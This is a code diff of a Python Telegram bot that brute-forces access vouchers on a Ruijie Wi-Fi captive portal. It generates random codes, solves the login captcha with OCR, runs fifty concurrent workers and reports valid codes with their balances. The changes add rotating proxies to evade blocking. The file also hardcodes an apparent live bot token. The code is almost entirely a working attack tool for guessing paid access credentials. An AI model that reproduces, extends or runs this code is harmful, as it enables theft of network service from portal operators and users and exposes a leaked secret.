@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # =====================================================================================
 #  sirzipp.py — FINAL VERSION
-#  Dashboard Inside Scanner + No Separate Task
+#  Message Not Modified Fix + CURRENT_CODE Fix + proxies.txt
 # =====================================================================================
 
 import os
@@ -29,6 +29,7 @@ from telegram.ext import (Application, CallbackQueryHandler, CommandHandler,
 BOT_TOKEN = "8810710930:AAFf_yQc4WBJlVk9nk9yDQuJsqfyjCGOVL8"
 
 PORTAL_URL_PATH = "portal_url_"
+PROXY_FILE = "proxies.txt"
 MAX_CODES_PER_SESSION = 100000
 MAX_CODES_PER_SID = 1000
 NUM_WORKERS = 50
@@ -44,6 +45,41 @@ BALANCE_URL = "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/
 user_scanners = {}
 _ocr_instance = None
 bot = None
+
+# ── PROXY MANAGER ────────────────────────────────────────────────────────────
+
+PROXY_LIST = []
+_proxy_index = 0
+
+
+def load_proxies():
+    global PROXY_LIST
+    if os.path.exists(PROXY_FILE):
+        with open(PROXY_FILE, "r") as f:
+            lines = [l.strip() for l in f if l.strip()]
+        PROXY_LIST = lines
+        print(f"[PROXY] Loaded {len(PROXY_LIST)} proxies")
+    else:
+        PROXY_LIST = []
+        print("[PROXY] No proxies.txt file")
+
+
+def save_proxies(proxy_text):
+    global PROXY_LIST
+    lines = [l.strip() for l in proxy_text.split("\n") if l.strip()]
+    with open(PROXY_FILE, "w") as f:
+        f.write("\n".join(lines))
+    PROXY_LIST = lines
+    print(f"[PROXY] Saved {len(PROXY_LIST)} proxies")
+
+
+def get_next_proxy():
+    global _proxy_index
+    if not PROXY_LIST:
+        return None
+    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
+    _proxy_index += 1
+    return proxy
 
 
 # ── BANNER ───────────────────────────────────────────────────────────────────
@@ -112,16 +148,16 @@ def ocr_image_bytes_fast(image_bytes):
 
 # ── CAPTCHA ──────────────────────────────────────────────────────────────────
 
-async def solve_captcha_simple_async(session, captcha_url, headers):
+async def solve_captcha_simple_async(session, captcha_url, headers, proxy=None):
     current_url = captcha_url + "?sessionId=" if "?" not in captcha_url else captcha_url + "&_t=" + str(time.time())
-    response = await session.get(current_url, headers=headers, ssl=False)
+    response = await session.get(current_url, headers=headers, ssl=False, proxy=proxy)
     image_content = await response.read()
     return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
 
 
 # ── SID (Auto-Detect) ────────────────────────────────────────────────────────
 
-async def get_sid_from_gateway(session, portal_url, user_id):
+async def get_sid_from_gateway(session, portal_url, user_id, proxy=None):
     ud = get_user_data(user_id)
     if ud["stop_event"].is_set():
         return None
@@ -146,7 +182,8 @@ async def get_sid_from_gateway(session, portal_url, user_id):
     body1 = ""
     final_url1 = portal_url
     try:
-        r1 = await session.get(portal_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False, allow_redirects=True)
+        r1 = await session.get(portal_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False,
+                               allow_redirects=True, proxy=proxy)
         body1 = await r1.text()
         final_url1 = str(r1.url)
     except Exception:
@@ -175,7 +212,7 @@ async def get_sid_from_gateway(session, portal_url, user_id):
 
 # ── BALANCE ──────────────────────────────────────────────────────────────────
 
-async def fetch_balance(active_token, code, retries=5):
+async def fetch_balance(active_token, code, retries=5, proxy=None):
     url = BALANCE_URL + active_token + "?lang=en_US"
     headers = {
         "authority": "portal-as.ruijienetworks.com",
@@ -189,7 +226,7 @@ async def fetch_balance(active_token, code, retries=5):
     for attempt in range(retries):
         try:
             async with aiohttp.ClientSession() as s:
-                resp = await s.get(url, headers=headers, timeout=TIMEOUT_SEC, ssl=False)
+                resp = await s.get(url, headers=headers, timeout=TIMEOUT_SEC, ssl=False, proxy=proxy)
                 raw_text = await resp.text()
                 try:
                     data = json.loads(raw_text)
@@ -231,11 +268,11 @@ async def fetch_balance(active_token, code, retries=5):
     return "N/A"
 
 
-# ── CHECK SINGLE CODE ────────────────────────────────────────────────────────
+# ── CHECK SINGLE CODE (Proxy + Direct Fallback) ──────────────────────────────
 
 async def check_single_access_code(session, code, current_session_id,
                                    login_url, captcha_base_url, verify_url,
-                                   headers, user_id):
+                                   headers, user_id, proxy=None):
     ud = get_user_data(user_id)
     if ud["stop_event"].is_set():
         return
@@ -245,10 +282,10 @@ async def check_single_access_code(session, code, current_session_id,
         if ud["stop_event"].is_set():
             return
         try:
-            auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
+            auth_code = await solve_captcha_simple_async(session, captcha_url, headers, proxy=proxy)
             v_payload = {"sessionId": current_session_id, "authCode": auth_code}
             v_resp = await session.post(verify_url, json=v_payload, headers=headers,
-                                        ssl=False, timeout=TIMEOUT_SEC)
+                                        ssl=False, timeout=TIMEOUT_SEC, proxy=proxy)
             v_data = await v_resp.json()
             l_payload = {
                 "accessCode": code,
@@ -257,16 +294,19 @@ async def check_single_access_code(session, code, current_session_id,
                 "authCode": auth_code,
             }
             l_resp = await session.post(login_url, json=l_payload, headers=headers,
-                                        ssl=False, timeout=TIMEOUT_SEC)
+                                        ssl=False, timeout=TIMEOUT_SEC, proxy=proxy)
             l_text = await l_resp.text()
         except Exception:
+            if proxy is not None:
+                proxy = None
+                continue
             return
 
         token_match = re.search(r"token[=:\"'\s]+([A-Za-z0-9_\-\.]+)", l_text)
         if token_match:
             active_token = token_match.group(1)
             ud["stats"]["tried"] += 1
-            balance_str = await fetch_balance(active_token, code)
+            balance_str = await fetch_balance(active_token, code, proxy=proxy)
             if not any(c["code"] == code for c in ud["stats"]["valid_codes"]):
                 ud["stats"]["valid_codes"].append({
                     "code": code,
@@ -298,52 +338,55 @@ async def check_single_access_code(session, code, current_session_id,
 
 async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
     ud = get_user_data(user_id)
-    async with aiohttp.ClientSession() as session:
-        current_session_id = None
-        codes_checked_this_sid = 0
-        codes_checked_this_session = 0
-        sid_failures = 0
-        while not ud["stop_event"].is_set():
-            if current_session_id is None or codes_checked_this_sid >= MAX_CODES_PER_SID:
+    while not ud["stop_event"].is_set():
+        proxy = get_next_proxy()
+
+        async with aiohttp.ClientSession() as session:
+            current_session_id = None
+            codes_checked_this_sid = 0
+            codes_checked_this_session = 0
+            sid_failures = 0
+            while not ud["stop_event"].is_set():
+                if current_session_id is None or codes_checked_this_sid >= MAX_CODES_PER_SID:
+                    if ud["stop_event"].is_set():
+                        break
+                    sid = await get_sid_from_gateway(session, ud["portal_url"], user_id, proxy=proxy)
+                    if sid:
+                        current_session_id = sid
+                        codes_checked_this_sid = 0
+                        sid_failures = 0
+                    else:
+                        sid_failures += 1
+                        if sid_failures >= 10:
+                            await asyncio.sleep(5)
+                            sid_failures = 0
+                            break
+                        await asyncio.sleep(1)
+                        continue
                 if ud["stop_event"].is_set():
                     break
-                sid = await get_sid_from_gateway(session, ud["portal_url"], user_id)
-                if sid:
-                    current_session_id = sid
-                    codes_checked_this_sid = 0
-                    sid_failures = 0
+                if ud["mode"] == "custom" and ud["start_digit"]:
+                    body_chars = random.choices(ud["char_set"], k=ud["code_len"])
+                    body_chars = [c if i > 0 else ud["start_digit"] for i, c in enumerate(body_chars)]
+                    random.shuffle(body_chars)
+                    code = ud["start_digit"] + "".join(body_chars[:ud["code_len"] - 1])
                 else:
-                    sid_failures += 1
-                    if sid_failures >= 10:
-                        await asyncio.sleep(5)
-                        sid_failures = 0
-                        continue
-                    await asyncio.sleep(1)
+                    code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))
+                if code in ud["stats"]["tried_codes"]:
                     continue
-            if ud["stop_event"].is_set():
-                break
-            if ud["mode"] == "custom" and ud["start_digit"]:
-                body_chars = random.choices(ud["char_set"], k=ud["code_len"])
-                body_chars = [c if i > 0 else ud["start_digit"] for i, c in enumerate(body_chars)]
-                random.shuffle(body_chars)
-                code = ud["start_digit"] + "".join(body_chars[:ud["code_len"] - 1])
-            else:
-                code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))
-            if code in ud["stats"]["tried_codes"]:
-                continue
-            ud["stats"]["tried_codes"].add(code)
-            ud["stats"]["CURRENT_CODE"] = code
-            await asyncio.sleep(0.001)
-            await check_single_access_code(session, code, current_session_id,
-                                           login_url, captcha_base_url,
-                                           verify_url, headers, user_id)
-            codes_checked_this_sid += 1
-            codes_checked_this_session += 1
-            if codes_checked_this_session >= MAX_CODES_PER_SESSION:
-                break
+                ud["stats"]["tried_codes"].add(code)
+                ud["CURRENT_CODE"] = code
+                await asyncio.sleep(0.001)
+                await check_single_access_code(session, code, current_session_id,
+                                               login_url, captcha_base_url,
+                                               verify_url, headers, user_id, proxy=proxy)
+                codes_checked_this_sid += 1
+                codes_checked_this_session += 1
+                if codes_checked_this_session >= MAX_CODES_PER_SESSION:
+                    break
 
 
-# ── RUN SCANNER (Dashboard Inside) ───────────────────────────────────────────
+# ── RUN SCANNER ──────────────────────────────────────────────────────────────
 
 async def run_user_scanner(context, user_id):
     ud = get_user_data(user_id)
@@ -354,10 +397,11 @@ async def run_user_scanner(context, user_id):
             "valid_codes": [], "limit_codes": [], "tried_codes": set(),
             "recent_logs": [], "recheck_queue": [],
         }
+        ud["CURRENT_CODE"] = "----"
         ud["stop_event"].clear()
-        msg = await context.bot.send_message(chat_id=user_id, text="🔄 Initializing dashboard...")
+
+        msg = await context.bot.send_message(chat_id=user_id, text="⚡ Scanner Starting...")
         ud["dash_msg_id"] = msg.message_id
-        print(f"[RUN] Dashboard message ID: {ud['dash_msg_id']}")
 
         login_url = LOGIN_URL
         captcha_base_url = CAPTCHA_BASE_URL
@@ -374,14 +418,11 @@ async def run_user_scanner(context, user_id):
             for i in range(NUM_WORKERS)
         ]
 
-        # ⭐ Dashboard Update Loop (ဒီနေရာမှာပဲ Update လုပ်)
         last_update = 0
         while not ud["stop_event"].is_set():
-            # Workers တွေ ပြီးသွားရင် ရပ်
             if all(t.done() for t in worker_tasks):
                 break
 
-            # ၃ စက္ကန့်တစ်ခါ Update
             if time.time() - last_update >= 3:
                 last_update = time.time()
                 stats = ud["stats"]
@@ -394,14 +435,17 @@ async def run_user_scanner(context, user_id):
                 hit_str = "None yet" if not hit_list else "\n".join(
                     "🔥 " + item["code"] + " " + item["balance"] for item in hit_list)
                 last_log = stats["recent_logs"][-1] if stats["recent_logs"] else "None yet"
+                proxy_count = len(PROXY_LIST)
+                proxy_str = "Direct (No Proxy)" if proxy_count == 0 else str(proxy_count) + " proxies"
+                current_code = ud.get("CURRENT_CODE", "----")
                 text = ("⚡ Scanner Running ⚡\nThank for using By Telegram @sayarkn\n"
                         "━━━━━━━━━━━━━━━━━\n🏹 Tried: " + str(stats["tried"]) +
-                        "\n🎯 Current Code: " + stats["CURRENT_CODE"] +
+                        "\n🎯 Current Code: " + current_code +
                         "\n🔥 Hits: " + str(len(stats["valid_codes"])) +
                         "\n⚔️ Expired: " + str(stats["expired"]) +
                         "\n⚠️ Limits: " + str(stats["limits"]) +
                         "\n⚡ Speed: " + format(speed_cpm, ".1f") + " c/m"
-                        "\n🔀 Proxies: Direct (No Proxy)"
+                        "\n🔀 Proxies: " + proxy_str +
                         "\n━━━━━━━━━━━━━━━━━\n🔥 **Hit Codes**:\n" + hit_str +
                         "\n━━━━━━━━━━━━━━━━━\n🔥 Last: " + last_log)
                 keyboard = [[InlineKeyboardButton("🛑 Stop", callback_data="stop_scan")]]
@@ -416,10 +460,13 @@ async def run_user_scanner(context, user_id):
                 except asyncio.TimeoutError:
                     print(f"[DASHBOARD] Timeout: tried={stats['tried']}")
                 except Exception as e:
-                    print(f"[DASHBOARD ERROR] {e}")
+                    err_str = str(e)
+                    if "Message is not modified" in err_str:
+                        pass
+                    else:
+                        print(f"[DASHBOARD ERROR] {err_str}")
             await asyncio.sleep(1)
 
-        # Final Summary
         stats = ud["stats"]
         elapsed = time.time() - stats["start_time"]
         speed_cpm = stats["tried"] / elapsed * 60 if elapsed > 0 else 0
@@ -432,7 +479,6 @@ async def run_user_scanner(context, user_id):
         final_text = ("🛑 Scanner Stopped/Finished\n━━━━━━━━━━━━━━━━━\n"
                       "🔎 Total Tried: " + str(stats["tried"]) +
                       "\n⚡ Final Speed: " + format(speed_cpm, ".1f") + " c/m"
-                      "\n🔀 Proxies: Direct (No Proxy)"
                       "\n🟢 Hits: " + str(len(stats["valid_codes"])) +
                       "\n━━━━━━━━━━━━━━━━━\n📋 **All Hit Codes**:\n" + hit_str)
         try:
@@ -462,6 +508,7 @@ def get_main_menu_markup():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🌐 Update Portal", callback_data="btn_update_portal")],
         [InlineKeyboardButton("⚙️ Mode", callback_data="btn_mode_menu")],
+        [InlineKeyboardButton("➕ Add Proxies", callback_data="btn_add_proxies")],
         [InlineKeyboardButton("🚀 Start Scanner", callback_data="btn_start_scanner")],
         [InlineKeyboardButton("🛑 Stop Scanner", callback_data="stop_scan")],
     ])
@@ -500,9 +547,11 @@ async def stop_scan_command(update, context):
 @admin_only
 async def start(update, context):
     ud = get_user_data(update.effective_user.id)
+    proxy_count = len(PROXY_LIST)
+    proxy_str = "Direct (No Proxy)" if proxy_count == 0 else str(proxy_count) + " proxies"
     text = ("⚡ **Starlink Scanner Control Panel** ⚡\n\n"
             "⚙️ Current Mode: `" + ud["mode"] +
-            "`\n🔀 Proxies: `Direct (No Proxy)`")
+            "`\n🔀 Proxies: `" + proxy_str + "`")
     msg = await update.effective_message.reply_text(
         text, parse_mode=ParseMode.MARKDOWN, reply_markup=get_main_menu_markup())
     ud["menu_msg_id"] = msg.message_id
@@ -514,7 +563,6 @@ async def handle_callbacks(update, context):
     user_id = update.effective_user.id
     ud = get_user_data(user_id)
     data = query.data
-    # ⭐ query.answer() ကို try/except နဲ့ ခြုံ
     try:
         await query.answer()
     except Exception as e:
@@ -523,6 +571,16 @@ async def handle_callbacks(update, context):
     if data == "btn_update_portal":
         ud["state"]["waiting_for_portal_url"] = True
         await query.edit_message_text("🌐 **Portal URL ကို ပေးပေးပါ**")
+
+    elif data == "btn_add_proxies":
+        ud["state"]["waiting_for_proxies"] = True
+        await query.edit_message_text(
+            "📥 **Proxy များကို ပေးပေးပါ**\n\n"
+            "တစ်ကြောင်းတစ်ခု ထည့်ပါ:\n"
+            "`http://user:pass@host:port`\n"
+            "`socks5://host:port`\n"
+            "`http://host:port`",
+            parse_mode=ParseMode.MARKDOWN)
 
     elif data == "btn_mode_menu":
         await query.edit_message_text(
@@ -559,7 +617,7 @@ async def handle_callbacks(update, context):
             return
         panel = ("✅ `mode` ပြောင်းပြီးပါပြီ\n\n"
                  "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
-                 "⚙️ Current Mode: `" + ud["mode"] + "`\n\n✅ Active: `Direct (No Proxy)`")
+                 "⚙️ Current Mode: `" + ud["mode"] + "`")
         await query.edit_message_text(panel, parse_mode=ParseMode.MARKDOWN,
                                       reply_markup=get_main_menu_markup())
 
@@ -582,9 +640,11 @@ async def handle_callbacks(update, context):
             pass
 
     elif data == "btn_back_main":
+        proxy_count = len(PROXY_LIST)
+        proxy_str = "Direct (No Proxy)" if proxy_count == 0 else str(proxy_count) + " proxies"
         panel = ("⚡ **Starlink Scanner Control Panel** ⚡\n\n"
                  "⚙️ Current Mode: `" + ud["mode"] +
-                 "`\n🔀 Proxies: `Direct (No Proxy)`")
+                 "`\n🔀 Proxies: `" + proxy_str + "`")
         await query.edit_message_text(panel, parse_mode=ParseMode.MARKDOWN,
                                       reply_markup=get_main_menu_markup())
 
@@ -606,10 +666,16 @@ async def handle_text(update, context):
         with open(PORTAL_URL_PATH + str(user_id) + ".txt", "w") as f:
             f.write(url)
         await update.effective_message.reply_text(
-            "✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ\n\n"
-            "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
-            "⚙️ Current Mode: `" + ud["mode"] + "`",
-            parse_mode=ParseMode.MARKDOWN, reply_markup=get_main_menu_markup())
+            "✅ Portal URL ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ",
+            reply_markup=get_main_menu_markup())
+        return
+
+    if ud["state"].get("waiting_for_proxies"):
+        ud["state"]["waiting_for_proxies"] = False
+        save_proxies(text)
+        await update.effective_message.reply_text(
+            "✅ Proxies သိမ်းပြီးပါပြီ - " + str(len(PROXY_LIST)) + " proxies",
+            reply_markup=get_main_menu_markup())
         return
 
     if ud["state"].get("waiting_for_digit"):
@@ -626,6 +692,7 @@ async def handle_text(update, context):
 def main():
     global bot
     print("[MAIN] FINAL MODE initialized")
+    load_proxies()
     app = Application.builder().token(BOT_TOKEN).build()
     bot = app.bot
     app.add_handler(CommandHandler("start", start))
